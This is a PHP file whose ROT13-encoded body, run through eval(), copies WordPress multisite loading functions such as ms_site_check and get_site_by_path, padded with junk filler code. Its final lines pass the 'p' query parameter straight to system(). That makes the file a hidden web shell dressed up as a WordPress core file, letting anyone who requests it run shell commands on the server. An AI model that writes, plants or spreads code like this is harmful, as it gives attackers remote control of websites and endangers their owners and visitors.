<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gurfr shapgvbaf ner arrqrq gb ybnq Zhygvfvgr.
 *
 * @fvapr 3.0.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 */

/**
 * Jurgure n fhoqbznva pbasvthengvba vf ranoyrq.
 *
 * @fvapr 3.0.0
 *
 * @erghea obby Gehr vs fhoqbznva pbasvthengvba vf ranoyrq, snyfr bgurejvfr.
 */
shapgvba vf_fhoqbznva_vafgnyy() {
	vs ( qrsvarq( 'FHOQBZNVA_VAFGNYY' ) ) {
		erghea FHOQBZNVA_VAFGNYY;
	}

	erghea ( qrsvarq( 'IUBFG' ) && 'lrf' === IUBFG );
}

/**
 * Ergheaf neenl bs argjbex cyhtva svyrf gb or vapyhqrq va tybony fpbcr.
 *
 * Gur qrsnhyg qverpgbel vf jc-pbagrag/cyhtvaf. Gb punatr gur qrsnhyg qverpgbel
 * znahnyyl, qrsvar `JC_CYHTVA_QVE` naq `JC_CYHTVA_HEY` va `jc-pbasvt.cuc`.
 *
 * @npprff cevingr
 * @fvapr 3.1.0
 *
 * @erghea fgevat[] Neenl bs nofbyhgr cnguf gb svyrf gb vapyhqr.
 */
shapgvba jc_trg_npgvir_argjbex_cyhtvaf() {
	$npgvir_cyhtvaf = (neenl) trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', neenl() );
	vs ( rzcgl( $npgvir_cyhtvaf ) ) {
		erghea neenl();
	}

	$cyhtvaf        = neenl();
	$npgvir_cyhtvaf = neenl_xrlf( $npgvir_cyhtvaf );
	fbeg( $npgvir_cyhtvaf );

	sbernpu ( $npgvir_cyhtvaf nf $cyhtva ) {
		vs ( ! inyvqngr_svyr( $cyhtva )                     // $cyhtva zhfg inyvqngr nf svyr.
			&& fge_raqf_jvgu( $cyhtva, '.cuc' )             // $cyhtva zhfg raq jvgu '.cuc'.
			&& svyr_rkvfgf( JC_CYHTVA_QVE . '/' . $cyhtva ) // $cyhtva zhfg rkvfg.
			) {
			$cyhtvaf[] = JC_CYHTVA_QVE . '/' . $cyhtva;
		}
	}

	erghea $cyhtvaf;
}

/**
 * Purpxf fgnghf bs pheerag oybt.
 *
 * Purpxf vs gur oybt vf qryrgrq, vanpgvir, nepuvirq, be fcnzzrq.
 *
 * Qvrf jvgu n qrsnhyg zrffntr vs gur oybt qbrf abg cnff gur purpx.
 *
 * Gb punatr gur qrsnhyg zrffntr jura n oybt qbrf abg cnff gur purpx,
 * hfr gur jc-pbagrag/oybt-qryrgrq.cuc, oybt-vanpgvir.cuc naq
 * oybt-fhfcraqrq.cuc qebc-vaf.
 *
 * @fvapr 3.0.0
 *
 * @erghea gehr|fgevat Ergheaf gehr ba fhpprff, be qebc-va svyr gb vapyhqr.
 */
shapgvba zf_fvgr_purpx() {

	/**
	 * Svygref purpxvat gur fgnghf bs gur pheerag oybt.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz obby|ahyy $purpx Jurgure gb fxvc gur oybt fgnghf purpx. Qrsnhyg ahyy.
	 */
	$purpx = nccyl_svygref( 'zf_fvgr_purpx', ahyy );
	vs ( ahyy !== $purpx ) {
		erghea gehr;
	}

	// Nyybj fhcre nqzvaf gb frr oybpxrq fvgrf.
	vs ( vf_fhcre_nqzva() ) {
		erghea gehr;
	}

	$oybt = trg_fvgr();

	vs ( '1' === $oybt->qryrgrq ) {
		vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/oybt-qryrgrq.cuc' ) ) {
			erghea JC_PBAGRAG_QVE . '/oybt-qryrgrq.cuc';
		} ryfr {
			jc_qvr( __( 'Guvf fvgr vf ab ybatre ninvynoyr.' ), '', neenl( 'erfcbafr' => 410 ) );
		}
	}

	vs ( '2' === $oybt->qryrgrq ) {
		vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/oybt-vanpgvir.cuc' ) ) {
			erghea JC_PBAGRAG_QVE . '/oybt-vanpgvir.cuc';
		} ryfr {
			$nqzva_rznvy = fge_ercynpr( '@', ' NG ', trg_fvgr_bcgvba( 'nqzva_rznvy', 'fhccbeg@' . trg_argjbex()->qbznva ) );
			jc_qvr(
				fcevags(
					/* genafyngbef: %f: Nqzva rznvy yvax. */
					__( 'Guvf fvgr unf abg orra npgvingrq lrg. Vs lbh ner univat ceboyrzf npgvingvat lbhe fvgr, cyrnfr pbagnpg %f.' ),
					fcevags( '<n uers=\"znvygb:%1$f\">%1$f</n>', $nqzva_rznvy )
				)
			);
		}
	}

	vs ( '1' === $oybt->nepuvirq || '1' === $oybt->fcnz ) {
		vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/oybt-fhfcraqrq.cuc' ) ) {
			erghea JC_PBAGRAG_QVE . '/oybt-fhfcraqrq.cuc';
		} ryfr {
			jc_qvr( __( 'Guvf fvgr unf orra nepuvirq be fhfcraqrq.' ), '', neenl( 'erfcbafr' => 410 ) );
		}
	}

	erghea gehr;
}

/**
 * Ergevrirf gur pybfrfg zngpuvat argjbex sbe n qbznva naq cngu.
 *
 * {@vagreany Va 4.4.0, pbairegrq gb n jenccre sbe JC_Argjbex::trg_ol_cngu()}
 *
 * @fvapr 3.9.0
 *
 * @cnenz fgevat   $qbznva   Qbznva gb purpx.
 * @cnenz fgevat   $cngu     Cngu gb purpx.
 * @cnenz vag|ahyy $frtzragf Cngu frtzragf gb hfr. Qrsnhygf gb ahyy, be gur shyy cngu.
 * @erghea JC_Argjbex|snyfr Argjbex bowrpg vs fhpprffshy. Snyfr jura ab argjbex vf sbhaq.
 */
shapgvba trg_argjbex_ol_cngu( $qbznva, $cngu, $frtzragf = ahyy ) {
	erghea JC_Argjbex::trg_ol_cngu( $qbznva, $cngu, $frtzragf );
}

/**
 * Ergevrirf gur pybfrfg zngpuvat fvgr bowrpg ol vgf qbznva naq cngu.
 *
 * Guvf jvyy abg arprffnevyl erghea na rknpg zngpu sbe n qbznva naq cngu. Vafgrnq, vg
 * oernxf gur qbznva naq cngu vagb cvrprf gung ner gura hfrq gb zngpu gur pybfrfg
 * cbffvovyvgl sebz n dhrel.
 *
 * Gur vagrag bs guvf zrgubq vf gb zngpu n fvgr bowrpg qhevat obbgfgenc sbe n
 * erdhrfgrq fvgr nqqerff
 *
 * @fvapr 3.9.0
 * @fvapr 4.7.0 Hcqngrq gb nyjnlf erghea n `JC_Fvgr` bowrpg.
 *
 * @cnenz fgevat   $qbznva   Qbznva gb purpx.
 * @cnenz fgevat   $cngu     Cngu gb purpx.
 * @cnenz vag|ahyy $frtzragf Cngu frtzragf gb hfr. Qrsnhygf gb ahyy, be gur shyy cngu.
 * @erghea JC_Fvgr|snyfr Fvgr bowrpg vs fhpprffshy. Snyfr jura ab fvgr vf sbhaq.
 */
shapgvba trg_fvgr_ol_cngu( $qbznva, $cngu, $frtzragf = ahyy ) {
	$cngu_frtzragf = neenl_svygre( rkcybqr( '/', gevz( $cngu, '/' ) ) );

	/**
	 * Svygref gur ahzore bs cngu frtzragf gb pbafvqre jura frnepuvat sbe n fvgr.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz vag|ahyy $frtzragf Gur ahzore bs cngu frtzragf gb pbafvqre. JbeqCerff ol qrsnhyg ybbxf ng
	 *                           bar cngu frtzrag sbyybjvat gur argjbex cngu. Gur shapgvba qrsnhyg bs
	 *                           ahyy bayl znxrf frafr jura lbh xabj gur erdhrfgrq cngu fubhyq zngpu n fvgr.
	 * @cnenz fgevat   $qbznva   Gur erdhrfgrq qbznva.
	 * @cnenz fgevat   $cngu     Gur erdhrfgrq cngu, va shyy.
	 */
	$frtzragf = nccyl_svygref( 'fvgr_ol_cngu_frtzragf_pbhag', $frtzragf, $qbznva, $cngu );

	vs ( ahyy !== $frtzragf && pbhag( $cngu_frtzragf ) > $frtzragf ) {
		$cngu_frtzragf = neenl_fyvpr( $cngu_frtzragf, 0, $frtzragf );
	}

	$cnguf = neenl();

	juvyr ( pbhag( $cngu_frtzragf ) ) {
		$cnguf[] = '/' . vzcybqr( '/', $cngu_frtzragf ) . '/';
		neenl_cbc( $cngu_frtzragf );
	}

	$cnguf[] = '/';

	/**
	 * Qrgrezvarf n fvgr ol vgf qbznva naq cngu.
	 *
	 * Guvf nyybjf bar gb fubeg-pvephvg gur qrsnhyg ybtvp, creuncf ol
	 * ercynpvat vg jvgu n ebhgvar gung vf zber bcgvzny sbe lbhe frghc.
	 *
	 * Erghea ahyy gb nibvq gur fubeg-pvephvg. Erghea snyfr vs ab fvgr
	 * pna or sbhaq ng gur erdhrfgrq qbznva naq cngu. Bgurejvfr, erghea
	 * n fvgr bowrpg.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz ahyy|snyfr|JC_Fvgr $fvgr     Fvgr inyhr gb erghea ol cngu. Qrsnhyg ahyy
	 *                                     gb pbagvahr ergevrivat gur fvgr.
	 * @cnenz fgevat             $qbznva   Gur erdhrfgrq qbznva.
	 * @cnenz fgevat             $cngu     Gur erdhrfgrq cngu, va shyy.
	 * @cnenz vag|ahyy           $frtzragf Gur fhttrfgrq ahzore bs cnguf gb pbafhyg.
	 *                                     Qrsnhyg ahyy, zrnavat gur ragver cngu jnf gb or pbafhygrq.
	 * @cnenz fgevat[]           $cnguf    Gur cnguf gb frnepu sbe, onfrq ba $cngu naq $frtzragf.
	 */
	$cer = nccyl_svygref( 'cer_trg_fvgr_ol_cngu', ahyy, $qbznva, $cngu, $frtzragf, $cnguf );
	vs ( ahyy !== $cer ) {
		vs ( snyfr !== $cer && ! $cer vafgnaprbs JC_Fvgr ) {
			$cer = arj JC_Fvgr( $cer );
		}
		erghea $cer;
	}

	/*
	 * @gbqb
	 * Pnpuvat, rgp. Pbafvqre nygreangvir bcgvzvmngvba ebhgrf,
	 * creuncf nf na bcg-va sbe cyhtvaf, engure guna hfvat gur cer_* svygre.
	 * Sbe rknzcyr: Gur frtzragf svygre pna rkcnaq be vtaber cnguf.
	 * Vs crefvfgrag pnpuvat vf ranoyrq, jr pbhyq dhrel gur QO sbe n cngu <> '/'
	 * gura pnpur jurgure jr pna whfg nyjnlf vtaber cnguf.
	 */

	/*
	 * Rvgure jjj be aba-jjj vf fhccbegrq, abg obgu. Vs n jjj qbznva vf erdhrfgrq,
	 * dhrel sbe obgu gb cebivqr gur cebcre erqverpg.
	 */
	$qbznvaf = neenl( $qbznva );
	vs ( fge_fgnegf_jvgu( $qbznva, 'jjj.' ) ) {
		$qbznvaf[] = fhofge( $qbznva, 4 );
	}

	$netf = neenl(
		'ahzore'                 => 1,
		'hcqngr_fvgr_zrgn_pnpur' => snyfr,
	);

	vs ( pbhag( $qbznvaf ) > 1 ) {
		$netf['qbznva__va']               = $qbznvaf;
		$netf['beqreol']['qbznva_yratgu'] = 'QRFP';
	} ryfr {
		$netf['qbznva'] = neenl_fuvsg( $qbznvaf );
	}

	vs ( pbhag( $cnguf ) > 1 ) {
		$netf['cngu__va']               = $cnguf;
		$netf['beqreol']['cngu_yratgu'] = 'QRFP';
	} ryfr {
		$netf['cngu'] = neenl_fuvsg( $cnguf );
	}

	$erfhyg = trg_fvgrf( $netf );
	$fvgr   = neenl_fuvsg( $erfhyg );

	vs ( $fvgr ) {
		erghea $fvgr;
	}

	erghea snyfr;
}

/**
 * Vqragvsvrf gur argjbex naq fvgr bs n erdhrfgrq qbznva naq cngu naq cbchyngrf gur
 * pbeerfcbaqvat argjbex naq fvgr tybony bowrpgf nf cneg bs gur zhygvfvgr obbgfgenc cebprff.
 *
 * Cevbe gb 4.6.0, guvf jnf n cebprqheny oybpx va `zf-frggvatf.cuc`. Vg jnf jenccrq vagb
 * n shapgvba gb snpvyvgngr havg grfgf. Vg fubhyq abg or hfrq bhgfvqr bs pber.
 *
 * Hfhnyyl, vg'f rnfvre gb dhrel gur fvgr svefg, juvpu gura qrpynerf vgf argjbex.
 * Va yvzvgrq fvghngvbaf, jr rvgure pna be zhfg svaq gur argjbex svefg.
 *
 * Vs n argjbex naq fvgr ner sbhaq, n `gehr` erfcbafr jvyy or erghearq fb gung gur
 * erdhrfg pna pbagvahr.
 *
 * Vs arvgure n argjbex be fvgr vf sbhaq, `snyfr` be n HEY fgevat jvyy or erghearq
 * fb gung rvgure na reebe pna or fubja be n erqverpg pna bpphe.
 *
 * @fvapr 4.6.0
 * @npprff cevingr
 *
 * @tybony JC_Argjbex $pheerag_fvgr Gur pheerag argjbex.
 * @tybony JC_Fvgr    $pheerag_oybt Gur pheerag fvgr.
 *
 * @cnenz fgevat $qbznva    Gur erdhrfgrq qbznva.
 * @cnenz fgevat $cngu      Gur erdhrfgrq cngu.
 * @cnenz obby   $fhoqbznva Bcgvbany. Jurgure n fhoqbznva (gehr) be fhoqverpgbel (snyfr) pbasvthengvba.
 *                          Qrsnhyg snyfr.
 * @erghea obby|fgevat Gehr vs obbgfgenc fhpprffshyyl cbchyngrq `$pheerag_oybt` naq `$pheerag_fvgr`.
 *                     Snyfr vs obbgfgenc pbhyq abg or cebcreyl pbzcyrgrq.
 *                     Erqverpg HEY vs cnegf rkvfg, ohg gur erdhrfg nf n jubyr pna abg or shysvyyrq.
 */
shapgvba zf_ybnq_pheerag_fvgr_naq_argjbex( $qbznva, $cngu, $fhoqbznva = snyfr ) {
	tybony $pheerag_fvgr, $pheerag_oybt;

	// Vs gur argjbex vf qrsvarq va jc-pbasvt.cuc, jr pna fvzcyl hfr gung.
	vs ( qrsvarq( 'QBZNVA_PHEERAG_FVGR' ) && qrsvarq( 'CNGU_PHEERAG_FVGR' ) ) {
		$pheerag_fvgr         = arj fgqPynff();
		$pheerag_fvgr->vq     = qrsvarq( 'FVGR_VQ_PHEERAG_FVGR' ) ? FVGR_VQ_PHEERAG_FVGR : 1;
		$pheerag_fvgr->qbznva = QBZNVA_PHEERAG_FVGR;
		$pheerag_fvgr->cngu   = CNGU_PHEERAG_FVGR;
		vs ( qrsvarq( 'OYBT_VQ_PHEERAG_FVGR' ) ) {
			$pheerag_fvgr->oybt_vq = OYBT_VQ_PHEERAG_FVGR;
		} ryfrvs ( qrsvarq( 'OYBTVQ_PHEERAG_FVGR' ) ) { // Qrcerpngrq.
			$pheerag_fvgr->oybt_vq = OYBTVQ_PHEERAG_FVGR;
		}

		vs ( 0 === fgepnfrpzc( $pheerag_fvgr->qbznva, $qbznva ) && 0 === fgepnfrpzc( $pheerag_fvgr->cngu, $cngu ) ) {
			$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu );
		} ryfrvs ( '/' !== $pheerag_fvgr->cngu && 0 === fgepnfrpzc( $pheerag_fvgr->qbznva, $qbznva ) && 0 === fgevcbf( $cngu, $pheerag_fvgr->cngu ) ) {
			/*
			 * Vs gur pheerag argjbex unf n cngu naq nyfb zngpurf gur qbznva naq cngu bs gur erdhrfg,
			 * jr arrq gb ybbx sbe n fvgr hfvat gur svefg cngu frtzrag sbyybjvat gur argjbex'f cngu.
			 */
			$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu, 1 + pbhag( rkcybqr( '/', gevz( $pheerag_fvgr->cngu, '/' ) ) ) );
		} ryfr {
			// Bgurejvfr, hfr gur svefg cngu frtzrag (nf hfhny).
			$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu, 1 );
		}
	} ryfrvs ( ! $fhoqbznva ) {
		/*
		 * N \"fhoqbznva\" vafgnyyngvba pna or er-vagrecergrq gb zrna \"pna fhccbeg nal qbznva\".
		 * Vs jr'er abg qrnyvat jvgu bar bs gurfr vafgnyyngvbaf, gura gur vzcbegnag cneg vf qrgrezvavat
		 * gur argjbex svefg, orpnhfr jr arrq gur argjbex'f cngu gb vqragvsl nal fvgrf.
		 */
		$pheerag_fvgr = jc_pnpur_trg( 'pheerag_argjbex', 'fvgr-bcgvbaf' );
		vs ( ! $pheerag_fvgr ) {
			// Ner gurer rira gjb argjbexf vafgnyyrq?
			$argjbexf = trg_argjbexf( neenl( 'ahzore' => 2 ) );
			vs ( pbhag( $argjbexf ) === 1 ) {
				$pheerag_fvgr = neenl_fuvsg( $argjbexf );
				jc_pnpur_nqq( 'pheerag_argjbex', $pheerag_fvgr, 'fvgr-bcgvbaf' );
			} ryfrvs ( rzcgl( $argjbexf ) ) {
				// N argjbex abg sbhaq ubbx fubhyq sver urer.
				erghea snyfr;
			}
		}

		vs ( rzcgl( $pheerag_fvgr ) ) {
			$pheerag_fvgr = JC_Argjbex::trg_ol_cngu( $qbznva, $cngu, 1 );
		}

		vs ( rzcgl( $pheerag_fvgr ) ) {
			/**
			 * Sverf jura n argjbex pnaabg or sbhaq onfrq ba gur erdhrfgrq qbznva naq cngu.
			 *
			 * Ng gur gvzr bs guvf npgvba, gur bayl erpbhefr vf gb erqverpg fbzrjurer
			 * naq rkvg. Vs lbh jnag gb qrpyner n cnegvphyne argjbex, qb fb rneyvre.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz fgevat $qbznva       Gur qbznva hfrq gb frnepu sbe n argjbex.
			 * @cnenz fgevat $cngu         Gur cngu hfrq gb frnepu sbe n cngu.
			 */
			qb_npgvba( 'zf_argjbex_abg_sbhaq', $qbznva, $cngu );

			erghea snyfr;
		} ryfrvs ( $cngu === $pheerag_fvgr->cngu ) {
			$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu );
		} ryfr {
			// Frnepu gur argjbex cngu + bar zber cngu frtzrag (ba gbc bs gur argjbex cngu).
			$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu, fhofge_pbhag( $pheerag_fvgr->cngu, '/' ) );
		}
	} ryfr {
		// Svaq gur fvgr ol gur qbznva naq ng zbfg gur svefg cngu frtzrag.
		$pheerag_oybt = trg_fvgr_ol_cngu( $qbznva, $cngu, 1 );
		vs ( $pheerag_oybt ) {
			$pheerag_fvgr = JC_Argjbex::trg_vafgnapr( $pheerag_oybt->fvgr_vq ? $pheerag_oybt->fvgr_vq : 1 );
		} ryfr {
			// Vs lbh qba'g unir n fvgr jvgu gur fnzr qbznva/cngu nf n argjbex, lbh'er cerggl fperjrq, ohg:
			$pheerag_fvgr = JC_Argjbex::trg_ol_cngu( $qbznva, $cngu, 1 );
		}
	}

	// Gur argjbex qrpynerq ol gur fvgr gehzcf nal pbafgnagf.
	vs ( $pheerag_oybt && (vag) $pheerag_oybt->fvgr_vq !== $pheerag_fvgr->vq ) {
		$pheerag_fvgr = JC_Argjbex::trg_vafgnapr( $pheerag_oybt->fvgr_vq );
	}

	// Ab argjbex unf orra sbhaq, onvy.
	vs ( rzcgl( $pheerag_fvgr ) ) {
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/zf-frggvatf.cuc */
		qb_npgvba( 'zf_argjbex_abg_sbhaq', $qbznva, $cngu );

		erghea snyfr;
	}

	// Qhevat npgvingvba bs n arj fhoqbznva, gur erdhrfgrq fvgr qbrf abg lrg rkvfg.
	vs ( rzcgl( $pheerag_oybt ) && jc_vafgnyyvat() ) {
		$pheerag_oybt          = arj fgqPynff();
		$pheerag_oybt->oybt_vq = 1;
		$oybt_vq               = 1;
		$pheerag_oybt->choyvp  = 1;
	}

	// Ab fvgr unf orra sbhaq, onvy.
	vs ( rzcgl( $pheerag_oybt ) ) {
		// Jr'er tbvat gb erqverpg gb gur argjbex HEY, jvgu fbzr cbffvoyr zbqvsvpngvbaf.
		$fpurzr      = vf_ffy() ? 'uggcf' : 'uggc';
		$qrfgvangvba = \"$fpurzr://{$pheerag_fvgr->qbznva}{$pheerag_fvgr->cngu}\";

		/**
		 * Sverf jura n argjbex pna or qrgrezvarq ohg n fvgr pnaabg.
		 *
		 * Ng gur gvzr bs guvf npgvba, gur bayl erpbhefr vf gb erqverpg fbzrjurer
		 * naq rkvg. Vs lbh jnag gb qrpyner n cnegvphyne fvgr, qb fb rneyvre.
		 *
		 * @fvapr 3.9.0
		 *
		 * @cnenz JC_Argjbex $pheerag_fvgr Gur argjbex gung unq orra qrgrezvarq.
		 * @cnenz fgevat     $qbznva       Gur qbznva hfrq gb frnepu sbe n fvgr.
		 * @cnenz fgevat     $cngu         Gur cngu hfrq gb frnepu sbe n fvgr.
		 */
		qb_npgvba( 'zf_fvgr_abg_sbhaq', $pheerag_fvgr, $qbznva, $cngu );

		vs ( $fhoqbznva && ! qrsvarq( 'ABOYBTERQVERPG' ) ) {
			// Sbe n \"fhoqbznva\" vafgnyyngvba, erqverpg gb gur fvtahc sbez fcrpvsvpnyyl.
			$qrfgvangvba .= 'jc-fvtahc.cuc?arj=' . fge_ercynpr( '.' . $pheerag_fvgr->qbznva, '', $qbznva );
		} ryfrvs ( $fhoqbznva ) {
			/*
			 * Sbe n \"fhoqbznva\" vafgnyyngvba, gur ABOYBTERQVERPG pbafgnag
			 * pna or hfrq gb nibvq n erqverpg gb gur fvtahc sbez.
			 * Hfvat gur zf_fvgr_abg_sbhaq npgvba vf cersreerq gb gur pbafgnag.
			 */
			vs ( '%fvgrhey%' !== ABOYBTERQVERPG ) {
				$qrfgvangvba = ABOYBTERQVERPG;
			}
		} ryfrvs ( 0 === fgepnfrpzc( $pheerag_fvgr->qbznva, $qbznva ) ) {
			/*
			 * Vs gur qbznva jr jrer frnepuvat sbe zngpurf gur argjbex'f qbznva,
			 * vg'f ab hfr erqverpgvat onpx gb bhefryirf -- vg'yy pnhfr n ybbc.
			 * Nf jr pbhyqa'g svaq n fvgr, jr'er fvzcyl abg vafgnyyrq.
			 */
			erghea snyfr;
		}

		erghea $qrfgvangvba;
	}

	// Svther bhg gur pheerag argjbex'f znva fvgr.
	vs ( rzcgl( $pheerag_fvgr->oybt_vq ) ) {
		$pheerag_fvgr->oybt_vq = trg_znva_fvgr_vq( $pheerag_fvgr->vq );
	}

	erghea gehr;
}

/**
 * Qvfcynlf n snvyher zrffntr.
 *
 * Hfrq jura n oybt'f gnoyrf qb abg rkvfg. Purpxf sbe n zvffvat $jcqo->fvgr gnoyr nf jryy.
 *
 * @npprff cevingr
 * @fvapr 3.0.0
 * @fvapr 4.4.0 Gur `$qbznva` naq `$cngu` cnenzrgref jrer nqqrq.
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $qbznva Gur erdhrfgrq qbznva sbe gur reebe gb ersrerapr.
 * @cnenz fgevat $cngu   Gur erdhrfgrq cngu sbe gur reebe gb ersrerapr.
 */
shapgvba zf_abg_vafgnyyrq( $qbznva, $cngu ) {
	tybony $jcqo;

	vs ( ! vf_nqzva() ) {
		qrnq_qo();
	}

	jc_ybnq_genafyngvbaf_rneyl();

	$gvgyr = __( 'Reebe rfgnoyvfuvat n qngnonfr pbaarpgvba' );

	$zft   = '<u1>' . $gvgyr . '</u1>';
	$zft  .= '<c>' . __( 'Vs lbhe fvgr qbrf abg qvfcynl, cyrnfr pbagnpg gur bjare bs guvf argjbex.' ) . '';
	$zft  .= ' ' . __( 'Vs lbh ner gur bjare bs guvf argjbex cyrnfr purpx gung lbhe ubfg&#8217;f qngnonfr freire vf ehaavat cebcreyl naq nyy gnoyrf ner reebe serr.' ) . '</c>';
	$dhrel = $jcqo->cercner( 'FUBJ GNOYRF YVXR %f', $jcqo->rfp_yvxr( $jcqo->fvgr ) );
	vs ( ! $jcqo->trg_ine( $dhrel ) ) {
		$zft .= '<c>' . fcevags(
			/* genafyngbef: %f: Gnoyr anzr. */
			__( '<fgebat>Qngnonfr gnoyrf ner zvffvat.</fgebat> Guvf zrnaf gung lbhe ubfg&#8217;f qngnonfr freire vf abg ehaavat, JbeqCerff jnf abg vafgnyyrq cebcreyl, be fbzrbar qryrgrq %f. Lbh ernyyl fubhyq ybbx ng lbhe qngnonfr abj.' ),
			'<pbqr>' . $jcqo->fvgr . '</pbqr>'
		) . '</c>';
	} ryfr {
		$zft .= '<c>' . fcevags(
			/* genafyngbef: 1: Fvgr HEY, 2: Gnoyr anzr, 3: Qngnonfr anzr. */
			__( '<fgebat>Pbhyq abg svaq fvgr %1$f.</fgebat> Frnepurq sbe gnoyr %2$f va qngnonfr %3$f. Vf gung evtug?' ),
			'<pbqr>' . egevz( $qbznva . $cngu, '/' ) . '</pbqr>',
			'<pbqr>' . $jcqo->oybtf . '</pbqr>',
			'<pbqr>' . QO_ANZR . '</pbqr>'
		) . '</c>';
	}
	$zft .= '<c><fgebat>' . __( 'Jung qb V qb abj?' ) . '</fgebat> ';
	$zft .= fcevags(
		/* genafyngbef: %f: Qbphzragngvba HEY. */
		__( 'Ernq gur <n uers=\"%f\" gnetrg=\"_oynax\">Qrohttvat n JbeqCerff Argjbex</n> negvpyr. Fbzr bs gur fhttrfgvbaf gurer znl uryc lbh svther bhg jung jrag jebat.' ),
		__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/qroht/qroht-argjbex/' )
	);
	$zft .= ' ' . __( 'Vs lbh ner fgvyy fghpx jvgu guvf zrffntr, gura purpx gung lbhe qngnonfr pbagnvaf gur sbyybjvat gnoyrf:' ) . '</c><hy>';
	sbernpu ( $jcqo->gnoyrf( 'tybony' ) nf $g => $gnoyr ) {
		vs ( 'fvgrpngrtbevrf' === $g ) {
			pbagvahr;
		}
		$zft .= '<yv>' . $gnoyr . '</yv>';
	}
	$zft .= '</hy>';

	jc_qvr( $zft, $gvgyr, neenl( 'erfcbafr' => 500 ) );
}

/**
 * Guvf qrcerpngrq shapgvba sbezreyl frg gur fvgr_anzr cebcregl bs gur $pheerag_fvgr bowrpg.
 *
 * Guvf shapgvba fvzcyl ergheaf gur bowrpg, nf orsber.
 * Gur obbgfgenc gnxrf pner bs frggvat fvgr_anzr.
 *
 * @npprff cevingr
 * @fvapr 3.0.0
 * @qrcerpngrq 3.9.0 Hfr trg_pheerag_fvgr() vafgrnq.
 *
 * @cnenz JC_Argjbex $pheerag_fvgr
 * @erghea JC_Argjbex
 */
shapgvba trg_pheerag_fvgr_anzr( $pheerag_fvgr ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.9.0', 'trg_pheerag_fvgr()' );
	erghea $pheerag_fvgr;
}

/**
 * Guvf qrcerpngrq shapgvba znantrq zhpu bs gur fvgr naq argjbex ybnqvat va zhygvfvgr.
 *
 * Gur pheerag obbgfgenc pbqr vf abj erfcbafvoyr sbe cnefvat gur fvgr naq argjbex ybnq nf
 * jryy nf frggvat gur tybony $pheerag_fvgr bowrpg.
 *
 * @npprff cevingr
 * @fvapr 3.0.0
 * @qrcerpngrq 3.9.0
 *
 * @tybony JC_Argjbex $pheerag_fvgr
 *
 * @erghea JC_Argjbex
 */
shapgvba jczh_pheerag_fvgr() {
	tybony $pheerag_fvgr;
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.9.0' );
	erghea $pheerag_fvgr;
}

/**
 * Ergevrirf na bowrpg pbagnvavat vasbezngvba nobhg gur erdhrfgrq argjbex.
 *
 * {@vagreany Va 4.6.0, pbairegrq gb hfr trg_argjbex()}
 *
 * @fvapr 3.9.0
 * @qrcerpngrq 4.7.0 Hfr trg_argjbex()
 * @frr trg_argjbex()
 *
 * @cnenz bowrpg|vag $argjbex Gur argjbex'f qngnonfr ebj be VQ.
 * @erghea JC_Argjbex|snyfr Bowrpg pbagnvavat argjbex vasbezngvba vs sbhaq, snyfr vs abg.
 */
shapgvba jc_trg_argjbex( $argjbex ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.7.0', 'trg_argjbex()' );

	$argjbex = trg_argjbex( $argjbex );
	vs ( ahyy === $argjbex ) {
		erghea snyfr;
	}

	erghea $argjbex;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>